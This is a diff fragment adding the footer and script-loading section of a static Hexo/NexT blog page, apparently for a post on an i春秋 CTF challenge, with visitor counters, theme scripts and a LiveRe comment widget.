+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.2.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+
+
+<script>
+  window.livereOptions = {
+    refer: '2020/01/12/i春秋ctf(4)/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  
+
+</body>
+</html>
